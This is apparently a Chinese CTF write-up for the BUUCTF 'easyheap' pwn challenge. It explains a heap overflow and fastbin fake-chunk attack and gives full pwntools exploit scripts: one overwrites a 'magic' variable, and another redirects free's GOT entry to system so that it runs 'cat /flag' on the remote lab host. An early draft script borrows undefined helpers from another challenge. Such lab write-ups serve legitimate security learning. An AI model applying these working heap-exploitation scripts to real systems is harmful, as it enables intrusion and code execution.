+++
title = "wp"
date = "2026-04-17"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-3', '2-3-3']
draft = false
+++
一道堆溢出，看起来跟2-2-2差不多，可以借鉴一下，应该也是UAF
先来看一下他给的
Pasted image 20260417084008.png
main里面大部分都是好的，有一个部分如下：
```c
   if ( v3 == 4869 )
      {
        if ( magic <= (unsigned __int64)'\x13\x05' )   //\x13\x05就是4869
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();  //这个函数会直接给flag
        }
      }
```

来写基本的函数：
```python
def create(size,content):  
    r.sendlineafter(b"Your choice :",b'1')  
    r.sendlineafter(b"Size of Heap :",str(size))   #不行就把str删了  
    r.sendlineafter(b'Content of heap:',content)  
  
def edit(index,size,content):  
    r.sendlineafter(b"Your choice :",b'2')  
    r.sendlineafter(b"index :",str(index))  
    r.sendlineafter(b"Size of Heap :",str(size))  
    r.sendlineafter(b'Content of heap:',content)  
  
def delete(index):  
    r.sendlineafter(b"Your choice :",b'3')  
    r.sendlineafter(b"Index :",str(index))  
  
def exit():  
    r.sendlineafter(b"Your choice :",b'4')  
  
def cat_flag():  
    r.sendlineafter(b"Your choice :",b'4870')
```



结合2-2-2来看，先申请几个堆块，前面几个都是0x10，最后一个0x80.把1，2，free了。。。。后面去看2-2-2：wp
原本打算这么写的：
```python
create(16,b'')  #0  
create(16,b'')  #1  
create(16,b'')  #2  
create(16,b'')  #3  
create(128,b'')  #4  
delete(1)  
delete(2)  
payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)  
fill(0,len(payload),payload)  
payload=p64(0)*3+p64(0x21)  
fill(3,len(payload),payload)  
create(16,b'')  
create(16,b'')  
payload=p64(0)*3+p64(0x91)  
edit(3,len(payload),payload)  
create(128,b'')  
delete(4)  
dump(2)  
mainarena88=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))  
mainarena=mainarena88-88  
malloc_hook=mainarena-0x10  
libc=LibcSearcher('__malloc_hook',malloc_hook)  
libcbase=malloc_hook-libc.dump('__malloc_hook')  
create(96,b'')  
delete(4)  
payload=p64(malloc_hook-35)  
edit(2,len(payload),payload)  
create(96,b'')  
create(96,b'')  
system=libcbase+0x4526a  
payload=p64(0)*2+p8(0)*3+p64(system)  
edit(6,len(payload),payload)  
create(1,b'')
```
Pasted image 20260417091658.png
Pasted image 20260417092210.png
但是发现一个问题，他没给输出函数，没法让他把mainarena直接交出来
那就只能用他本身的设计的漏洞
一个 free chunk 被取走后，下一次 malloc 有可能返回它的 fd 指向的位置。 fd 控制的是“下一次分配到哪”， 不是“当前写入自动延伸到哪”。
只要把fd改到magic就结了。
```python
magic = elf.symbols["magic"]
```
试着写了下面的脚本：
```python
create(0x10,b'')  #0  
create(0x60,b'')  #1  
delete(1)  
payload = p64(0)*3 + p64(0x71) + p64(magic-0X10)  
edit(0, len(payload), payload)  
create(0x60,b'')  
payload = p64(0x1306)  
create(0x30,payload)
```
Pasted image 20260417100722.png
说明magic已经写进去了
但是实际上不能写在整数地址，可能会有检查，所以搞一个错位地址
为什么一定是-16-3呢
- magic-16-3 读到的大致是 0x7f
- magic-16-4 读到的大致是 0x7fff
本质区别是：
- 从 0x6020b5 开始读时，只吃到 stdin 地址的高 3 个字节，结果是个很小的值
- 从 0x6020b4 开始读时，多吃进了一个 0xff，结果直接变成了 0x7fff
大概就是这样。
exp1：
```python
from pwn import *  
  
elf = ELF('./easyheap')  
context(log_level='debug', arch='i386', os='linux')  
  
r = remote('node5.buuoj.cn', 29649)  
#r = process('./easyheap')  
def dbg():  
    gdb.attach(r)  
    pause()  
  
def create(size,content):  
    r.sendlineafter(b"Your choice :",b'1')  
    r.sendlineafter(b"Size of Heap :",str(size))   #不行就把str删了  
    r.sendlineafter(b'Content of heap:',content)  
  
def edit(index, size, content):  
    r.sendlineafter(b"Your choice :", b"2")  
    r.sendlineafter(b"Index :", str(index).encode())  
    r.sendlineafter(b"Size of Heap :", str(size).encode())  
    r.sendafter(b"Content of heap : ", content)  
  
def delete(index):  
    r.sendlineafter(b"Your choice :",b'3')  
    r.sendlineafter(b"Index :",str(index))  
  
def exit():  
    r.sendlineafter(b"Your choice :",b'4')  
  
def cat_flag():  
    r.sendlineafter(b"Your choice :",b'4869')  
  
magic = elf.symbols["magic"]  
#magic = 0x006020C0  
#fakechunk = 0x6020AD  
create(0x10,b'')  #0  
create(0x60,b'')  #1  
delete(1)  
payload = p64(0)*3 + p64(0x71) + p64(magic-16-3)  
edit(0, len(payload), payload)  
create(0x60,b'')  
payload = b"\x00" * 3 + p64(0x1306)  
create(0x60, payload)  
cat_flag()  
  
r.interactive()
```
本来应该就这么结束的，但好像容器没搞好。所以还是要想办法getshell
Pasted image 20260417103616.png
想办法改一个函数成system
比方说free
codex通解
exp2：
```python
from pwn import *

context.binary = elf = ELF('./easyheap')
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

io = remote('node5.buuoj.cn', 27663)

def add(size, content):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap:', content)

def edit(index, size, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap : ', content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())

add(0x60, b'a')    # 0
add(0x60, b'a')      # 1
add(0x60, b'a')    # 2

delete(2)

payload = b'A' * 0x60 + p64(0) + p64(0x71) + p64(0x6020ad)
edit(1, len(payload), payload)

add(0x60, b'a')                             # 2
add(0x60, b'A' * 0x23 + p64(elf.got['free']))   # 3

edit(0, 8, p64(elf.plt['system']))
edit(1, len(b'cat /flag\x00'), b'cat /flag\x00')

delete(1)
io.interactive()

```
